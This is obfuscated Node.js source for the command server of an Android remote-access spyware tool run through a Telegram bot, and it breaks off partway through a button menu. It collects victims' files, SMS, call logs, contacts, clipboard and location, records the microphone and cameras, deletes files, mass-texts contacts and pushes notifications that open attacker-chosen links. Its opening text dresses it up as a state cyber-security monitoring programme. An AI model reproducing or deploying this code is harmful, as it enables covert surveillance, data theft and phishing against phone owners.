var _0x52ef = ["\x65\x78\x70\x72\x65\x73\x73", "\x77\x73", "\x68\x74\x74\x70", "\x6E\x6F\x64\x65\x2D\x74\x65\x6C\x65\x67\x72\x61\x6D\x2D\x62\x6F\x74\x2D\x61\x70\x69", "\x75\x75\x69\x64", "\x6D\x75\x6C\x74\x65\x72", "\x62\x6F\x64\x79\x2D\x70\x61\x72\x73\x65\x72", "\x61\x78\x69\x6F\x73"];
const express = require(_0x52ef[0]);
const webSocket = require(_0x52ef[1]);
const http = require(_0x52ef[2]);
const telegramBot = require(_0x52ef[3]);
const uuid4 = require(_0x52ef[4]);
const multer = require(_0x52ef[5]);
const bodyParser = require(_0x52ef[6]);
const axios = require(_0x52ef[7])

const token = 'rx74'
const id = '3856702'
const address = 'https://www.google.com'

var _0xdc21 = ["createServer", "json", "use", "", "/", "<h1 align=\"center\">✔️ تم تحميل الخادم بنجاح</h1>", "send", "get", "/uploadFile", "file", "single", "originalname", "buffer", "°• رسالة من <b>", "model", "headers", "</b> 𝙙𝙚𝙫𝙞𝙘𝙚", "HTML", "application/txt", "sendDocument", "post", "/uploadText", "</b> 𝙙𝙚𝙫𝙞𝙘𝙚\\n\\n", "text", "body", "sendMessage", "/uploadLocation", "lat", "lon", "sendLocation", "°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>", "connection", "v4", "battery", "version", "brightness", "provider", "uuid", "set", "°• جهاز جديد متصل 🆕\\n\\n", "• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>", "</b>\\n", "• ʙᴀᴛᴛᴇʀʏ : <b>", "• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>", "• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>", "• ᴘʀᴏᴠɪᴅᴇʀ : <b>", "</b>", "close", "°• تم فصل الجهاز 🚫\\n\\n", "delete", "on", "message", "id", "chat", "reply_to_message", "°• يرجى الرد على الرقم الذي تريد إرسال الرسائل القصيرة إليه", "includes", "°• رائع الآن أدخل الرسالة التي تريد إرسالها إلى هذا الرقم\n\n", "• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ", "°• رائع الآن أدخل الرسالة التي تريد إرسالها إلى هذا الرقم", "send_message:", "forEach", "clients", "°• طلبك قيد المعالجة\n\n", "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", "عدد ضحايا☣️", "𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙", "°• إرسال رسالة إلى جميع جهات الاتصال", "send_message_to_all:", "°• أدخل مسار الملف الذي تريد تنزيله", "file:", "°• أدخل مسار الملف الذي تريد حذفه", "delete_file:", "°• أدخل المدة التي تريد تسجيل الميكروفون فيها", "microphone:", "°• أدخل المدة التي تريد تسجيل الكاميرا الرئيسية فيها", "rec_camera_main:", "°• أدخل المدة التي تريد تسجيل كاميرا الصورة الذاتية", "rec_camera_selfie:", "°• أدخل الرسالة التي تريد أن تظهر على الجهاز الهدف", "toast:", "°• أدخل الرسالة التي تريد أن تظهر كإشعار", "°• رائع الآن أدخل الرابط الذي تريد فتحه بواسطة الإشعار\n\n", "• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ", "°• رائع الآن أدخل الرابط الذي تريد فتحه بواسطة الإشعار", "show_notification:", "°• أدخل الرابط الصوتي الذي تريد تشغيله", "play_audio:", "/start", "°• مرحبًا بكم في برنامج مرصاد ZR0،\n\n", "• وحدة الأمن الإلكتروني السيبراني -ZR0 المتخصصة في حماية أمن المعلومات والبيانات الوطنية و الرصد الاستخباراتي والمكافحة الالكترونية. تم إعداد وتقديم برنامج مرصاد للاستخدام في الرصد المعلوماتي و السيطرة الكاملة على انظمة ألاندرويد وفقًا للتوجيهات المعتمدة. يُرجى عدم استخدامة بشكل فردي أو بدون الضوابط والتوجيهات التقنية اللازمة، ويجب عدم استخدامه بدون الخبرة الفنية الكافية أو المعرفة التقنية للأطراف المعنية.\n\n", "• الدعم الفني https://t.me/zr0zz\n\n", "• تم التطوير بقيادة @Goody_stor\n\n", "• اضغط هنا /start ", "size", "°• لا توجد أجهزة توصيل متاحة\n\n", "• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ", "°• قائمة الأجهزة المتصلة :\n\n", "</b>\\n\\n", "device:", "push", "°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙚𝙣𝙙", "°• تم رفض الإذن", "callback_query", "data", ":", "split", "log", "device", "°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>", "message_id", "تطبيقات📱", "apps:", "معلومات الهاتفℹ️", "device_info:", "تحميل ملف📂", "حذف ملف📂", "الحافظه🗒", "clipboard:", "ميكروفون🎤", "صوره خلفيه📷", "camera_main:", "صوره اماميه📸", "camera_selfie:", "الموقع ♂️", "location:", "اضهار رساله💢", "مكالمات📞", "calls:", "جهات الاتصال📔", "contacts:", "اهتزاز📳", "vibrate:", "اضهار الاشعارات👁", "رسائل✉️", "messages:", "ارسل رساله📨️", "تشغيل صوت🎵", "توقف صوت🔇", "stop_audio:", "إرسال  رسالة إلى جميع جهات الاتصال", "editMessageText", "calls", "deleteMessage", "contacts", "messages", "apps", "device_info", "clipboard", "camera_main", "camera_selfie", "location", "vibrate", "stop_audio", "send_message", "°• يرجى الرد على الرقم الذي تريد إرسال الرسائل القصيرة إليه\n\n", "•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ", "send_message_to_all", "°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال\n\n", "°• أدخل مسار الملف الذي تريد تنزيله\n\n", "• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.", "delete_file", "°• أدخل مسار الملف الذي تريد حذفه\n\n", "• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ᴅᴇʟᴇᴛᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.", "microphone", "°• أدخل المدة التي تريد تسجيل الميكروفون فيها\n\n", "• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ", "toast", "°• أدخل الرسالة التي تريد أن تظهر على الجهاز الهدف\n\n", "• ᴛᴏᴀꜱᴛ ɪꜱ ᴀ ꜱʜᴏʀᴛ ᴍᴇꜱꜱᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀꜱ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ ꜱᴄʀᴇᴇɴ ꜰᴏʀ ᴀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅꜱ", "show_notification", "°• أدخل الرسالة التي تريد أن تظهر كإشعار\n\n", "• ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜꜱ ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ", "play_audio", "°• أدخل الرابط الصوتي الذي تريد تشغيله\n\n", "• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏꜰ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴅ", "ping", "then", "PORT", "env", "listen"];
const app = express();
const appServer = http[_0xdc21[0]](app);
const appSocket = new webSocket.Server({
   server: appServer
});
const appBot = new telegramBot(token, {
   polling: true
});
const appClients = new Map();
const upload = multer();
app[_0xdc21[2]](bodyParser[_0xdc21[1]]());
let currentUuid = _0xdc21[3];
let currentNumber = _0xdc21[3];
let currentTitle = _0xdc21[3];
app[_0xdc21[7]](_0xdc21[4], function (_0xeb57xa, _0xeb57xb) {
   _0xeb57xb[_0xdc21[6]](_0xdc21[5])
});
app[_0xdc21[20]](_0xdc21[8], upload[_0xdc21[10]](_0xdc21[9]), (_0xeb57xa, _0xeb57xb) => {
   const _0xeb57xc = _0xeb57xa[_0xdc21[9]][_0xdc21[11]];
   appBot[_0xdc21[19]](id, _0xeb57xa[_0xdc21[9]][_0xdc21[12]], {
      caption: `${_0xdc21[13]}${_0xeb57xa[_0xdc21[15]][_0xdc21[14]]}${_0xdc21[16]}`,
      parse_mode: _0xdc21[17]
   }, {
      filename: _0xeb57xc,
      contentType: _0xdc21[18]
   });
   _0xeb57xb[_0xdc21[6]](_0xdc21[3])
});
app[_0xdc21[20]](_0xdc21[21], (_0xeb57xa, _0xeb57xb) => {
   appBot[_0xdc21[25]](id, `${_0xdc21[13]}${_0xeb57xa[_0xdc21[15]][_0xdc21[14]]}${_0xdc21[22]}` + _0xeb57xa[_0xdc21[24]][_0xdc21[23]], {
      parse_mode: _0xdc21[17]
   });
   _0xeb57xb[_0xdc21[6]](_0xdc21[3])
});
app[_0xdc21[20]](_0xdc21[26], (_0xeb57xa, _0xeb57xb) => {
   appBot[_0xdc21[29]](id, _0xeb57xa[_0xdc21[24]][_0xdc21[27]], _0xeb57xa[_0xdc21[24]][_0xdc21[28]]);
   appBot[_0xdc21[25]](id, `${_0xdc21[30]}${_0xeb57xa[_0xdc21[15]][_0xdc21[14]]}${_0xdc21[16]}`, {
      parse_mode: _0xdc21[17]
   });
   _0xeb57xb[_0xdc21[6]](_0xdc21[3])
});
appSocket[_0xdc21[50]](_0xdc21[31], (_0xeb57xd, _0xeb57xa) => {
   const _0xeb57xe = uuid4[_0xdc21[32]]();
   const _0xeb57xf = _0xeb57xa[_0xdc21[15]][_0xdc21[14]];
   const _0xeb57x10 = _0xeb57xa[_0xdc21[15]][_0xdc21[33]];
   const _0xeb57x11 = _0xeb57xa[_0xdc21[15]][_0xdc21[34]];
   const _0xeb57x12 = _0xeb57xa[_0xdc21[15]][_0xdc21[35]];
   const _0xeb57x13 = _0xeb57xa[_0xdc21[15]][_0xdc21[36]];
   _0xeb57xd[_0xdc21[37]] = _0xeb57xe;
   appClients[_0xdc21[38]](_0xeb57xe, {
      model: _0xeb57xf,
      battery: _0xeb57x10,
      version: _0xeb57x11,
      brightness: _0xeb57x12,
      provider: _0xeb57x13
   });
   appBot[_0xdc21[25]](id, `${_0xdc21[39]}` + `${_0xdc21[40]}${_0xeb57xf}${_0xdc21[41]}` + `${_0xdc21[42]}${_0xeb57x10}${_0xdc21[41]}` + `${_0xdc21[43]}${_0xeb57x11}${_0xdc21[41]}` + `${_0xdc21[44]}${_0xeb57x12}${_0xdc21[41]}` + `${_0xdc21[45]}${_0xeb57x13}${_0xdc21[46]}`, {
      parse_mode: _0xdc21[17]
   });
   _0xeb57xd[_0xdc21[50]](_0xdc21[47], function () {
      appBot[_0xdc21[25]](id, `${_0xdc21[48]}` + `${_0xdc21[40]}${_0xeb57xf}${_0xdc21[41]}` + `${_0xdc21[42]}${_0xeb57x10}${_0xdc21[41]}` + `${_0xdc21[43]}${_0xeb57x11}${_0xdc21[41]}` + `${_0xdc21[44]}${_0xeb57x12}${_0xdc21[41]}` + `${_0xdc21[45]}${_0xeb57x13}${_0xdc21[46]}`, {
         parse_mode: _0xdc21[17]
      });
      appClients[_0xdc21[49]](_0xeb57xd[_0xdc21[37]])
   })
});
appBot[_0xdc21[50]](_0xdc21[51], (_0xeb57x14) => {
   const _0xeb57x15 = _0xeb57x14[_0xdc21[53]][_0xdc21[52]];
   if (_0xeb57x14[_0xdc21[54]]) {
      if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[55])) {
         currentNumber = _0xeb57x14[_0xdc21[23]];
         appBot[_0xdc21[25]](id, _0xdc21[57] + _0xdc21[58], {
            reply_markup: {
               force_reply: true
            }
         })
      };
      if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[59])) {
         appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
               _0xeb57xd[_0xdc21[6]](`${_0xdc21[60]}${currentNumber}${_0xdc21[4]}${_0xeb57x14[_0xdc21[23]]}${_0xdc21[3]}`)
            }
         });
         currentNumber = _0xdc21[3];
         currentUuid = _0xdc21[3];
         appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
               "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
                  [_0xdc21[65]],
                  [_0xdc21[66]]
               ],
               '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
            }
         })
      };
      if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[67])) {
         const _0xeb57x17 = _0xeb57x14[_0xdc21[23]];
         appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
               _0xeb57xd[_0xdc21[6]](`${_0xdc21[68]}${_0xeb57x17}${_0xdc21[3]}`)
            }
         });
         currentUuid = _0xdc21[3];
         appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
               "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
                  [_0xdc21[65]],
                  [_0xdc21[66]]
               ],
               '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
            }
         })
      };
      if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[69])) {
         const _0xeb57x18 = _0xeb57x14[_0xdc21[23]];
         appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
               _0xeb57xd[_0xdc21[6]](`${_0xdc21[70]}${_0xeb57x18}${_0xdc21[3]}`)
            }
         });
         currentUuid = _0xdc21[3];
         appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
               "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
                  [_0xdc21[65]],
                  [_0xdc21[66]]
               ],
               '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
            }
         })
      };
      if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[71])) {
         const _0xeb57x18 = _0xeb57x14[_0xdc21[23]];
         appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
               _0xeb57xd[_0xdc21[6]](`${_0xdc21[72]}${_0xeb57x18}${_0xdc21[3]}`)
            }
         });
         currentUuid = _0xdc21[3];
         appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
               "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
                  [_0xdc21[65]],
                  [_0xdc21[66]]
               ],
               '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
            }
         })
      };
      if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[73])) {
         const _0xeb57x19 = _0xeb57x14[_0xdc21[23]];
         appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
               _0xeb57xd[_0xdc21[6]](`${_0xdc21[74]}${_0xeb57x19}${_0xdc21[3]}`)
            }
         });
         currentUuid = _0xdc21[3];
         appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
               "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
                  [_0xdc21[65]],
                  [_0xdc21[66]]
               ],
               '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
            }
         })
      };
      if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[75])) {
         const _0xeb57x19 = _0xeb57x14[_0xdc21[23]];
         appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
               _0xeb57xd[_0xdc21[6]](`${_0xdc21[76]}${_0xeb57x19}${_0xdc21[3]}`)
            }
         });
         currentUuid = _0xdc21[3];
         appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
               "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
                  [_0xdc21[65]],
                  [_0xdc21[66]]
               ],
               '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
            }
         })
      };
      if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[77])) {
         const _0xeb57x19 = _0xeb57x14[_0xdc21[23]];
         appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
               _0xeb57xd[_0xdc21[6]](`${_0xdc21[78]}${_0xeb57x19}${_0xdc21[3]}`)
            }
         });
         currentUuid = _0xdc21[3];
         appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
               "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
                  [_0xdc21[65]],
                  [_0xdc21[66]]
               ],
               '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
            }
         })
      };
      if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[79])) {
         const _0xeb57x1a = _0xeb57x14[_0xdc21[23]];
         appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
               _0xeb57xd[_0xdc21[6]](`${_0xdc21[80]}${_0xeb57x1a}${_0xdc21[3]}`)
            }
         });
         currentUuid = _0xdc21[3];
         appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
               "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
                  [_0xdc21[65]],
                  [_0xdc21[66]]
               ],
               '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
            }
         })
      };
      if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[81])) {
         const _0xeb57x1b = _0xeb57x14[_0xdc21[23]];
         currentTitle = _0xeb57x1b;
         appBot[_0xdc21[25]](id, _0xdc21[82] + _0xdc21[83], {
            reply_markup: {
               force_reply: true
            }
         })
      };
      if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[84])) {
         const _0xeb57x1c = _0xeb57x14[_0xdc21[23]];
         appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
               _0xeb57xd[_0xdc21[6]](`${_0xdc21[85]}${currentTitle}${_0xdc21[4]}${_0xeb57x1c}${_0xdc21[3]}`)
            }
         });
         currentUuid = _0xdc21[3];
         appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
               "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
                  [_0xdc21[65]],
                  [_0xdc21[66]]
               ],
               '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
            }
         })
      };
      if (_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[86])) {
         const _0xeb57x1d = _0xeb57x14[_0xdc21[23]];
         appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd) {
            if (_0xeb57xd[_0xdc21[37]] == currentUuid) {
               _0xeb57xd[_0xdc21[6]](`${_0xdc21[87]}${_0xeb57x1d}${_0xdc21[3]}`)
            }
         });
         currentUuid = _0xdc21[3];
         appBot[_0xdc21[25]](id, _0xdc21[63] + _0xdc21[64], {
            parse_mode: _0xdc21[17],
            "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
               "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
                  [_0xdc21[65]],
                  [_0xdc21[66]]
               ],
               '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
            }
         })
      }
   };
   if (id == _0xeb57x15) {
      if (_0xeb57x14[_0xdc21[23]] == _0xdc21[88]) {
         appBot[_0xdc21[25]](id, _0xdc21[89] + _0xdc21[90] + _0xdc21[91] + _0xdc21[92] + _0xdc21[93], {
            parse_mode: _0xdc21[17],
            "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
               "\x6B\x65\x79\x62\x6F\x61\x72\x64": [
                  [_0xdc21[65]],
                  [_0xdc21[66]]
               ],
               '\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64': true
            }
         })
      };
      if (_0xeb57x14[_0xdc21[23]] == _0xdc21[65]) {
         if (appClients[_0xdc21[94]] == 0) {
            appBot[_0xdc21[25]](id, _0xdc21[95] + _0xdc21[96])
         } else {
            let _0xeb57x1e = _0xdc21[97];
            appClients[_0xdc21[61]](function (_0xeb57x1f, _0xeb57x20, _0xeb57x21) {
               _0xeb57x1e += `${_0xdc21[40]}${_0xeb57x1f[_0xdc21[14]]}${_0xdc21[41]}` + `${_0xdc21[42]}${_0xeb57x1f[_0xdc21[33]]}${_0xdc21[41]}` + `${_0xdc21[43]}${_0xeb57x1f[_0xdc21[34]]}${_0xdc21[41]}` + `${_0xdc21[44]}${_0xeb57x1f[_0xdc21[35]]}${_0xdc21[41]}` + `${_0xdc21[45]}${_0xeb57x1f[_0xdc21[36]]}${_0xdc21[98]}`
            });
            appBot[_0xdc21[25]](id, _0xeb57x1e, {
               parse_mode: _0xdc21[17]
            })
         }
      };
      if (_0xeb57x14[_0xdc21[23]] == _0xdc21[66]) {
         if (appClients[_0xdc21[94]] == 0) {
            appBot[_0xdc21[25]](id, _0xdc21[95] + _0xdc21[96])
         } else {
            const _0xeb57x22 = [];
            appClients[_0xdc21[61]](function (_0xeb57x1f, _0xeb57x20, _0xeb57x21) {
               _0xeb57x22[_0xdc21[100]]([{
                  text: _0xeb57x1f[_0xdc21[14]],
                  callback_data: _0xdc21[99] + _0xeb57x20
               }])
            });
            appBot[_0xdc21[25]](id, _0xdc21[101], {
               "\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70": {
                  "\x69\x6E\x6C\x69\x6E\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64": _0xeb57x22
               }
            })
         }
      }
   } else {
      appBot[_0xdc21[25]](id, _0xdc21[102])
   }
});
appBot[_0xdc21[50]](_0xdc21[103], (_0xeb57x23) => {
   const _0xeb57x24 = _0xeb57x23[_0xdc21[51]];
   const _0xeb57x25 = _0xeb57x23[_0xdc21[104]];
   const _0xeb57x26 = _0xeb57x25[_0xdc21[106]](_0xdc21[105])[0];
   const _0xeb57xe = _0xeb57x25[_0xdc21[106]](_0xdc21[105])[1];
   console[_0xdc21[107]](_0xeb57xe);
   if (_0xeb57x26 == _0xdc21[108]) {
      appBot[_0xdc21[141]](`${_0xdc21[109]}${appClients[_0xdc21[7]](_0xeb57x25[_0xdc21[106]](_0xdc21[105])[1])[_0xdc21[14]]}${_0xdc21[46]}`, {
         width: 10000,
         chat_id: id,
         message_id: _0xeb57x24[_0xdc21[110]],
         reply_markup: {
            inline_keyboard: [
               [{
                  text: _0xdc21[111],
                  callback_data: `${_0xdc21[112]}${_0xeb57xe}${_0xdc21[3]}`
               }, {
                  text: _0xdc21[113],
                  callback_data: `${_0xdc21[114]}${_0xeb57xe}${_0xdc21[3]}`
               }],
               [{
                  text: _0xdc21[115],
                  callback_data: `${_0xdc21[70]}${_0xeb57xe}${_0xdc21[3]}`
               }, {
                  text: _0xdc21[116],
                  callback_data: `${_0xdc21[72]}${_0xeb57xe}${_0xdc21[3]}`
               }],
               [{
                  text: _0xdc21[117],
                  callback_data: `${_0xdc21[118]}${_0xeb57xe}${_0xdc21[3]}`
               }, {
                  text: _0xdc21[119],
                  callback_data: `${_0xdc21[74]}${_0xeb57xe}${_0xdc21[3]}`
               }],
               [{
                  text: _0xdc21[120],
                  callback_data: `${_0xdc21[121]}${_0xeb57xe}${_0xdc21[3]}`
               }, {
                  text: _0xdc21[122],
                  callback_data: `${_0xdc21[123]}${_0xeb57xe}${_0xdc21[3]}`
               }],
               [{
                  text: _0xdc21[124],
                  callback_data: `${_0xdc21[125]}${_0xeb57xe}${_0xdc21[3]}`
               }, {
                  text: _0xdc21[126],
                  callback_data: `${_0xdc21[80]}${_0xeb57xe}${_0xdc21[3]}`
               }],
               [{
